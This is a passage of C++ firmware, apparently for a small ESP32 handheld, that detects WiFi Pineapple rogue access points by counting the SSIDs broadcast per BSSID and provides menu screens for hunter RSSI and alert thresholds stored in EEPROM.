  if (pineap_hunter_stats.scan_buffer.find(bssid_str) == pineap_hunter_stats.scan_buffer.end()) {
    pineap_hunter_stats.scan_buffer[bssid_str] = std::vector<SSIDRecord>();
  }

  // Check if this ESSID is already recorded for this BSSID
  auto& essid_list = pineap_hunter_stats.scan_buffer[bssid_str];
  bool found = false;
  for (auto& existing_record : essid_list) {
    if (existing_record.essid == essid) {
      // Update RSSI and timestamp when this SSID is seen again
      existing_record.rssi = rssi;
      existing_record.last_seen = millis();
      found = true;
      break;
    }
  }

  if (!found) {
    essid_list.push_back(SSIDRecord(essid, rssi));
  }
}

void process_scan_results() {
  std::vector<PineRecord> new_pineaps;

  // Check each BSSID in scan buffer for pineapple behavior
  for (const auto& entry : pineap_hunter_stats.scan_buffer) {
    const String& bssid_str = entry.first;
    const std::vector<SSIDRecord>& ssid_records = entry.second;

    if (ssid_records.size() >= ph_alert_ssids) {  // Use SSIDRecord vector size
      PineRecord pine;
      string_to_bssid(bssid_str, pine.bssid);
      pine.essids = ssid_records;  // Copy SSIDRecord vector with RSSI
      pine.last_seen = millis();

      // Sort SSIDs by most recent seen first (most recent timestamp = highest value)
      std::sort(pine.essids.begin(), pine.essids.end(),
        [](const SSIDRecord& a, const SSIDRecord& b) {
          return a.last_seen > b.last_seen;
        });

      new_pineaps.push_back(pine);
    }
  }

  // Update detected pineaps list if changed (smarter detection)
  if (new_pineaps.size() != pineap_hunter_stats.detected_pineaps.size()) {
    pineap_hunter_stats.list_changed = true;
  } else {
    // Same count, check if any pineap has different SSID count or new SSIDs
    for (size_t i = 0; i < new_pineaps.size(); i++) {
      const auto& old_pine = pineap_hunter_stats.detected_pineaps[i];
      const auto& new_pine = new_pineaps[i];

      // Compare BSSID and SSID count (avoid RSSI comparison due to sorting)
      if (memcmp(old_pine.bssid, new_pine.bssid, 6) != 0 ||
          old_pine.essids.size() != new_pine.essids.size()) {
        pineap_hunter_stats.list_changed = true;
        break;
      }
    }
  }

  pineap_hunter_stats.detected_pineaps = new_pineaps;
}

void maintain_buffer_size() {
  // Keep only the most recent 50 BSSID entries
  if (pineap_hunter_stats.scan_buffer.size() > 50) {
    // Simple approach: clear oldest entries (in practice, would use timestamps)
    auto it = pineap_hunter_stats.scan_buffer.begin();
    std::advance(it, pineap_hunter_stats.scan_buffer.size() - 50);
    pineap_hunter_stats.scan_buffer.erase(pineap_hunter_stats.scan_buffer.begin(), it);
  }
}

bool is_pineapple_detected(const std::vector<String>& essids) {
  return essids.size() >= ph_alert_ssids; // Use global threshold setting
}

void update_pineapple_list() {
  // This function processes scan results to update the detected pineaps list
  process_scan_results();
}

void update_display() {
  switch (pineap_hunter_stats.view_mode) {
    case 0: draw_main_list(); break;
    case 1: draw_bssid_details(); break;
    case 2: draw_ssid_list(); break;
  }
}

void draw_main_list() {
  DISP.fillScreen(BGCOLOR);
  int total_pineaps = pineap_hunter_stats.detected_pineaps.size();
  int total_items = total_pineaps + 1; // +1 for "Back"

  // Header
  DISP.setCursor(0, 0);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(BGCOLOR, FGCOLOR);  // Normal colors
  DISP.println(TXT_PINEAP_HUNTER);
  DISP.setTextColor(FGCOLOR, BGCOLOR);  // Normal colors
  DISP.setTextSize(SMALL_TEXT);

  if (total_pineaps == 0) {
    // No pineaps detected
    DISP.println("No PineAPs detected");
  } else {
    // Scrolling list logic similar to wscan_drawmenu()
    if (cursor > 4) {
      // Scrolling mode - show items starting from cursor-4
      for (int i = cursor - 4; i < total_pineaps && i < cursor + 5; i++) {
        if (cursor == i) {
          DISP.setTextColor(BGCOLOR, FGCOLOR);
        }
        const auto& pine = pineap_hunter_stats.detected_pineaps[i];
        String bssid_str = bssid_to_string(pine.bssid);
        DISP.printf("%s %d", bssid_str.c_str(), pine.essids.size());
        DISP.println();
        DISP.setTextColor(FGCOLOR, BGCOLOR);
      }
    } else {
      // Normal mode - show from beginning
      for (int i = 0; i < total_pineaps && i < 8; i++) {
        if (cursor == i) {
          DISP.setTextColor(BGCOLOR, FGCOLOR);
        }
        const auto& pine = pineap_hunter_stats.detected_pineaps[i];
        String bssid_str = bssid_to_string(pine.bssid);
        DISP.printf("%s %d", bssid_str.c_str(), pine.essids.size());
        DISP.println();
        DISP.setTextColor(FGCOLOR, BGCOLOR);
      }
    }
  }

  // Always show "Back" option
  if (cursor >= total_pineaps) {
    DISP.setTextColor(BGCOLOR, FGCOLOR);
  }
  DISP.println(TXT_BACK);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
}

void draw_bssid_details() {
  // Future enhancement - currently unused
  draw_ssid_list(); // For now, go directly to SSID list
}

void draw_ssid_list() {
  if (pineap_hunter_stats.selected_bssid_index >= pineap_hunter_stats.detected_pineaps.size()) {
    draw_main_list();
    return;
  }

  const auto& pine = pineap_hunter_stats.detected_pineaps[pineap_hunter_stats.selected_bssid_index];

  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(SMALL_TEXT);
  DISP.setCursor(0, 0);
  int total_ssids = pine.essids.size();
  int total_items = total_ssids + 1; // +1 for "Back"

  // Header with BSSID
  String bssid_str = bssid_to_string(pine.bssid);
  DISP.setTextColor(BGCOLOR, FGCOLOR);
  DISP.println(bssid_str); // Show last 6 chars
  DISP.setTextColor(FGCOLOR, BGCOLOR);

  // Scrolling list logic similar to WiFi scan
  if (cursor > 4) {
    // Scrolling mode - show items starting from cursor-4
    for (int i = cursor - 4; i < total_ssids && i < cursor + 5; i++) {
      if (cursor == i) {
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf("[%d] %s\n", pine.essids[i].rssi, pine.essids[i].essid.substring(0, 14).c_str());
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  } else {
    // Normal mode - show from beginning
    for (int i = 0; i < total_ssids && i < 7; i++) {
      if (cursor == i) {
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf("[%d] %s\n", pine.essids[i].rssi, pine.essids[i].essid.substring(0, 14).c_str());
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }

  // Always show "Back" option
  if (cursor >= total_ssids) {
    DISP.setTextColor(BGCOLOR, FGCOLOR);
  }
  DISP.println(TXT_BACK);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
}

void pineap_hunter_cleanup() {
  pineap_hunter_active = false;
  pineap_hunter_stats.scan_buffer.clear();
  pineap_hunter_stats.detected_pineaps.clear();
  rstOverride = false;
}

String bssid_to_string(const uint8_t* bssid) {
  char bssid_str[18];
  sprintf(bssid_str, "%02x:%02x:%02x:%02x:%02x:%02x",
          bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  return String(bssid_str);
}

void string_to_bssid(const String& bssid_str, uint8_t* bssid) {
  sscanf(bssid_str.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
         &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
}

void play_alert_beep() {
    #if defined(CARDPUTER)
      SPEAKER.tone(4000, 50);
    #elif defined(STICK_C_PLUS2)
      SPEAKER.tone(4000, 50);
    #endif
}

///////////////////////////////
/// HUNTER SETTINGS IMPLEMENTATION ///
///////////////////////////////

// Global variables for hunter settings
int bh_rssi_threshold = -40;
int dh_rssi_threshold = -20;
int bh_alert_pkts = 10;
int dh_alert_pkts = 10;

// BH RSSI Setting (-10 to -100 in increments of 5)
void bh_rssi_setup() {
  DISP.setCursor(0, 0);
  DISP.println("BH RSSI Threshold");
  
  #if defined(USE_EEPROM)
    int stored_value = -(int8_t)EEPROM.read(6); // Cast to signed
    if(stored_value >= -100 && stored_value <= -10 && stored_value % 5 == 0) {
      bh_rssi_threshold = stored_value;
    }
  #endif
  
  cursor = (bh_rssi_threshold + 100) / 5; // Convert -100 to -10 range to 0-18
  rstOverride = true;
  delay(500);
  DISP.fillScreen(BGCOLOR);
}

void bh_rssi_loop() {
  DISP.setCursor(0, 0);
  DISP.println("BH RSSI Threshold");
  DISP.printf("Current: %d dBm\n", bh_rssi_threshold);
  DISP.println("Range: -10 to -100");
  
  if (check_next_press()) {
    cursor++;
    cursor = cursor % 19; // 0-18 for -100 to -10 in steps of 5
    bh_rssi_threshold = -100 + (cursor * 5);
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.printf("BH RSSI: %d dBm", bh_rssi_threshold);
    delay(250);
    DISP.fillScreen(BGCOLOR);

  }
  
  if (check_select_press()) {
    #if defined(USE_EEPROM)
      Serial.printf("Writing %d to EEPROM 6 - value %d\n", abs(bh_rssi_threshold), bh_rssi_threshold);
      EEPROM.write(6, abs(bh_rssi_threshold)); // Store as signed byte
      EEPROM.commit();
      bh_max_rssi = bh_rssi_threshold;
    #endif
    rstOverride = false;
    isSwitching = true;
    current_proc = 2; // Return to settings menu
    delay(250);
  }
}

// DH RSSI Setting (-10 to -100 in increments of 5)  
void dh_rssi_setup() {
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println("DH RSSI Threshold");
  delay(500);
  
  #if defined(USE_EEPROM)
    int stored_value = -(int8_t)EEPROM.read(8); // Cast to signed
    if(stored_value >= -100 && stored_value <= -10 && stored_value % 5 == 0) {
      dh_rssi_threshold = stored_value;
    }
  #endif
  
  cursor = (dh_rssi_threshold + 100) / 5; // Convert -100 to -10 range to 0-18
  rstOverride = true;
  
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.printf("DH RSSI: %d dBm\n", dh_rssi_threshold);
  delay(500);
}

void dh_rssi_loop() {
  DISP.setCursor(0, 0);
  DISP.println("DH RSSI Threshold");
  DISP.printf("Current: %d dBm\n", dh_rssi_threshold);
  DISP.println("Range: -10 to -100");
  
  if (check_next_press()) {
    cursor++;
    cursor = cursor % 19; // 0-18 for -100 to -10 in steps of 5
    dh_rssi_threshold = -100 + (cursor * 5);
    delay(250);
  }
  
  if (check_select_press()) {
    #if defined(USE_EEPROM)
      Serial.printf("Writing %d to EEPROM 8 - value %d\n", abs(dh_rssi_threshold), dh_rssi_threshold);
      EEPROM.write(8, abs(dh_rssi_threshold)); // Store as signed byte
      EEPROM.commit();
      dh_max_rssi = dh_rssi_threshold;
    #endif
    rstOverride = false;
    isSwitching = true;
    current_proc = 2; // Return to settings menu
    delay(250);
  }
}

// BH Alert Pkts Setting (0-100)
void bh_alert_pkts_setup() {
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println("BH Alert Packets");
  delay(500);
  
  #if defined(USE_EEPROM)
    int stored_value = EEPROM.read(7);
    if(stored_value <= 100) {
      bh_alert_pkts = stored_value;
    }
  #endif
  
  cursor = bh_alert_pkts;
  rstOverride = true;
}

void bh_alert_pkts_loop() {
  DISP.setCursor(0, 0);
  DISP.println("BH Alert Packets");
  DISP.printf("Current: %3d\n", bh_alert_pkts);
  DISP.println("Range: 0-100");
  
  if (check_next_press()) {
    cursor++;
    cursor = cursor % 101; // 0-100
        if (cursor < 0) {
      cursor = 99;
    }
    bh_alert_pkts = cursor;
    delay(250);
  }
  
  if (check_select_press()) {
    #if defined(USE_EEPROM)
      EEPROM.write(7, bh_alert_pkts);
      EEPROM.commit();
      bh_pkts=bh_alert_pkts;
      Serial.printf("Writing %d to EEPROM 7\n", bh_alert_pkts);
    #endif
    rstOverride = false;
    isSwitching = true;
    current_proc = 2; // Return to settings menu
    delay(250);
  }
}

// DH Alert Pkts Setting (0-100)
void dh_alert_pkts_setup() {
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println("DH Alert Packets");
  delay(500);
  
  #if defined(USE_EEPROM)
    int stored_value = EEPROM.read(9);
    if(stored_value <= 100) {
      dh_alert_pkts = stored_value;
    }
  #endif
  cursor = dh_alert_pkts;
  rstOverride = true;
}

void dh_alert_pkts_loop() {
  DISP.setCursor(0, 0);
  DISP.println("DH Alert Packets");
  DISP.printf("Current: %3d\n", dh_alert_pkts);
  DISP.println("Range: 0-100");
  
  if (check_next_press()) {
    cursor++;
    cursor = cursor % 101; // 0-100  
    if (cursor < 0) {
      cursor = 99;
    }
    dh_alert_pkts = cursor;
    delay(250);
  }
  
  if (check_select_press()) {
    #if defined(USE_EEPROM)
      EEPROM.write(9, dh_alert_pkts);
      EEPROM.commit();
      dh_pkts=dh_alert_pkts;
      Serial.printf("Writing %d to EEPROM 9\n", dh_alert_pkts);
    #endif
    rstOverride = false;
    isSwitching = true;
    current_proc = 2; // Return to settings menu
    delay(250);
  }
}

// PH Alert SSIDs Setting (2-100 in increments of 1)
void ph_alert_ssids_setup() {
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(TXT_PH_ALERT_SSIDS);
  delay(500);

  #if defined(USE_EEPROM)
    int stored_value = EEPROM.read(10);
    if(stored_value >= 2 && stored_value <= 100) {
      ph_alert_ssids = stored_value;
    }
  #endif
  cursor = ph_alert_ssids;
  rstOverride = true;
  delay(500);
}

void ph_alert_ssids_loop() {
  DISP.setCursor(0, 0);
  DISP.println(TXT_PH_ALERT_SSIDS);
  DISP.printf("Current: %3d\n", ph_alert_ssids);
  DISP.println("Range: 2-100");

  if (check_next_press()) {
    cursor++;
    if (cursor > 100) {
      cursor = 2; // Wrap to minimum
    }
    ph_alert_ssids = cursor;
    delay(250);
  }

  if (check_select_press()) {
    #if defined(USE_EEPROM)
      EEPROM.write(10, ph_alert_ssids);
      EEPROM.commit();
      Serial.printf("Writing %d to EEPROM 10\n", ph_alert_ssids);
    #endif
    rstOverride = false;
    isSwitching = true;
    current_proc = 2; // Return to settings menu
    delay(250);
  }
}
